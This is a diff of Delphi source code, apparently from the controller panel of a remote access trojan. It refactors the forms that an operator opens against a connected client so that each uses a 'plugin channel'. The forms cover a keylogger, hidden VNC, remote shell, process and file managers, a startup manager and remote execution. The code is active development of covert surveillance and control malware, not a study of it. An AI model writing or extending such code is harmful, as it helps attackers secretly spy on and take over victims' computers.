@@ -394,12 +394,9 @@ begin
 
   F11 := TForm11.Create(Application);
   FServerManager.RegisterRemoteExecutionForm(SelectedLine, F11);
-
-  F11.SetupForClient(SelectedLine, ClientID,
-                    FServerManager.SendJSON,
-                    FServerManager.UnregisterRemoteExecutionForm);
   F11.Show;
   F11.BringToFront;
+  FServerManager.OpenPluginChannel(SelectedLine, REMOTE_EXECUTION_PLUGIN_ID, F11);
 end;
 
 procedure TForm1.EnsureStartupManagerMenuItem;
@@ -471,13 +468,9 @@ begin
 
   F12 := TForm12.Create(Application);
   FServerManager.RegisterStartupManagerForm(SelectedLine, F12);
-
-  F12.SetupForClient(SelectedLine, ClientID,
-                    FServerManager.SendJSON,
-                    FServerManager.UnregisterStartupManagerForm);
   F12.Show;
   F12.BringToFront;
-  F12.RequestStartupList;
+  FServerManager.OpenPluginChannel(SelectedLine, STARTUP_MANAGER_PLUGIN_ID, F12);
 end;
 
 { ------------------------------------------------------------------ }
@@ -594,19 +587,9 @@ begin
   end;
 
   F4 := TForm4.Create(Application);
-
-  if FServerManager.TryGetClientInfo(SelectedLine, LInfo) then
-    F4.SetupForClient(SelectedLine, LInfo.ID,
-                      FServerManager.SendJSON,
-                      FServerManager.UnregisterProcessForm)
-  else
-    F4.SetupForClient(SelectedLine, 'Unknown',
-                      FServerManager.SendJSON,
-                      FServerManager.UnregisterProcessForm);
-
   FServerManager.RegisterProcessForm(SelectedLine, F4);
   F4.Show;
-  F4.RequestProcesses;
+  FServerManager.OpenPluginChannel(SelectedLine, PROCESS_MANAGER_PLUGIN_ID, F4);
 end;
 
 { ------------------------------------------------------------------ }
@@ -644,19 +627,9 @@ begin
   end;
 
   F5 := TForm5.Create(Application);
-
-  if FServerManager.TryGetClientInfo(SelectedLine, LInfo) then
-    F5.SetupForClient(SelectedLine, LInfo.ID,
-                      FServerManager.SendJSON,
-                      FServerManager.UnregisterRemoteShellForm)
-  else
-    F5.SetupForClient(SelectedLine, 'Unknown',
-                      FServerManager.SendJSON,
-                      FServerManager.UnregisterRemoteShellForm);
-
   FServerManager.RegisterRemoteShellForm(SelectedLine, F5);
   F5.Show;
-  F5.RequestShellStart;
+  FServerManager.OpenPluginChannel(SelectedLine, REMOTE_SHELL_PLUGIN_ID, F5);
 end;
 
 { ------------------------------------------------------------------ }
@@ -723,19 +696,9 @@ begin
   end;
 
   F6 := TForm6.Create(Application);
-
-  if FServerManager.TryGetClientInfo(SelectedLine, LInfo) then
-    F6.SetupForClient(SelectedLine, LInfo.ID,
-                      FServerManager.SendJSON,
-                      FServerManager.UnregisterMonitoringForm)
-  else
-    F6.SetupForClient(SelectedLine, 'Unknown',
-                      FServerManager.SendJSON,
-                      FServerManager.UnregisterMonitoringForm);
-
   FServerManager.RegisterMonitoringForm(SelectedLine, F6);
   F6.Show;
-  F6.RequestMonitorList;
+  FServerManager.OpenPluginChannel(SelectedLine, REMOTE_MONITORING_PLUGIN_ID, F6);
 end;
 
 { ------------------------------------------------------------------ }
@@ -778,11 +741,9 @@ begin
     FServerManager.RegisterKeyloggerForm(SelectedLine, F7);
   end;
 
-  F7.SetupForClient(SelectedLine, ClientID,
-                    FServerManager.SendJSON,
-                    FServerManager.UnregisterKeyloggerForm);
   F7.Show;
   F7.BringToFront;
+  FServerManager.OpenPluginChannel(SelectedLine, KEYLOGGER_PLUGIN_ID, F7);
 end;
 
 { ------------------------------------------------------------------ }
@@ -825,11 +786,9 @@ begin
     FServerManager.RegisterOpenURLForm(SelectedLine, F8);
   end;
 
-  F8.SetupForClient(SelectedLine, ClientID,
-                    FServerManager.SendJSON,
-                    FServerManager.UnregisterOpenURLForm);
   F8.Show;
   F8.BringToFront;
+  FServerManager.OpenPluginChannel(SelectedLine, OPEN_URL_PLUGIN_ID, F8);
 end;
 
 { ------------------------------------------------------------------ }
@@ -883,7 +842,9 @@ begin
                     FServerManager.UnregisterFileManagerForm);
   F9.Show;
   F9.BringToFront;
-  F9.RequestDrives;
+
+  // Request dedicated plugin channel for File Manager
+  FServerManager.OpenPluginChannel(SelectedLine, FILE_MANAGER_PLUGIN_ID, F9);
 end;
 
 procedure TForm1.FlowPanel1Click(Sender: TObject);
@@ -936,12 +897,9 @@ begin
 
   F10 := TForm10.Create(Application);
   FServerManager.RegisterHiddenVNCForm(SelectedLine, F10);
-
-  F10.SetupForClient(SelectedLine, ClientID,
-                     FServerManager.SendJSON,
-                     FServerManager.UnregisterHiddenVNCForm);
   F10.Show;
   F10.BringToFront;
+  FServerManager.OpenPluginChannel(SelectedLine, HIDDEN_VNC_PLUGIN_ID, F10);
 end;
 
 { ------------------------------------------------------------------ }
